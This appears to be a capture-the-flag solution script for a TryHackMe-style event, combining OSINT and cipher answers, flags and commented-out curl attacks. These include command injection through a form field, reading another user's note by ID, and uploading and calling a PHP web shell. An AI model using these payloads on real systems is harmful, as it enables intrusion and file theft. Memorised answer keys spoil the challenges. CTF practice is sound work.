#/bin/sh

# Retrieve absolute path to this script
script=$(readlink -f $0)
scriptpath=`dirname $script`

# Define target IP ( the machine to attack ) and attack IP ( the machine which supports the attack )
attack_ip="10.9.5.12"
result_folder="/work/results/"

# Prepare environment
mkdir $result_folder 2>/dev/null
points=0

echo "1 - CATCH ME IF YOU CAN"
# Using google images -> It's in beco de batman Sao Paulo
# It's at a crossroad between Beco de Batman and something starting with H, including an m -> Rua Harmonia
# Though the drawing is not the same under google maps at this specific point, we still recognize the chimney
# Restaurant is Coringa do beco
points=$((points + 15))

echo "2 - CATCH ME IF YOU CAN 2"
# Pigpen cipher on Pele butt : Meet at Torii portal
points=$((points + 30))

echo "3 - CATCH ME IF YOU CAN 3"
# On trip advisor, we find a restaurant named Mr Wok, next to the portal torii da liberdade
# https://www.tripadvisor.com.br/Restaurant_Review-g303631-d14802491-Reviews-Mr_Wok-Sao_Paulo_State_of_Sao_Paulo.html
# Address is Rua Galvão Bueno, 83, São Paulo, Estado de São Paulo 01506-000 Brasil
points=$((points + 60))

echo "4 - NOTEPAD ONLINE"
#target_ip="10.10.66.109"
#curl -s -X GET "http://$target_ip" -L -c $result_folder/cookies.txt > /dev/null
#curl -s -X POST http://$target_ip/ -b $result_folder/cookies.txt -H "Content-Type: application/x-www-form-urlencoded" -d "user=noel&pass=pass1234"
#curl -s -X GET http://$target_ip/note.php?note_id=0 -b $result_folder/cookies.txt -o $result_folder/note.html
FLAG=$(cat $result_folder/note.html | sed -n 's/.*<pre>\([^<]*\).*/\1/p')
echo "--> Flag is '$FLAG'"
points=$((points + 15))

echo "5 - DARK ENCRYPTOR"
#target_ip="10.10.114.117"
#curl -s -X POST "http://$target_ip:5000/" -L -H "Content-Type: application/x-www-form-urlencoded" -d "text_input=test+;+find+/+-type+f+-name+"flag.txt"&recipient=Cipher" -o $result_folder/path.html
FILENAME=$(cat $result_folder/path.html | grep flag.txt)
echo "--> Flag path is '$FILENAME'"
#curl -s -X POST "http://$target_ip:5000/" -L -H "Content-Type: application/x-www-form-urlencoded" -d "text_input=test+;+cat+$FILENAME&recipient=Cipher" -o $result_folder/flag.html
FLAG=$(cat $result_folder/flag.html | grep THM)
echo "--> Flag is '$FLAG'"
points=$((points + 30))

echo "6 - DARK ENCRYPTOR 2"
#target_ip="10.10.174.217"
#SHELL=webshell.txt
#echo "<?php" > $result_folder/$SHELL
#echo "    system(\$_GET[\"cmd\"]);" >> $result_folder/$SHELL
#echo " ?>" >> $result_folder/$SHELL
#curl -s -F "file=@$result_folder/$SHELL;type=application/octet-stream" -F "recipient=ByteReaper" -X POST "http://$target_ip:5000/" -o $result_folder/success-upload.html
#curl -s -X GET http:/$target_ip/uploads/$SHELL?cmd=find+/+-type+f+-name+"flag.txt" -o $result_folder/path.txt

echo "7 - ORDER"
# Key is  01010011 01001110 01000101 01000001 01001011 01011001 (SNEAKY), leading to ORDER: Attack at dawn. Target: THM{the_hackfinity_highschool}.
points=$((points + 30))

echo "Current score : $points"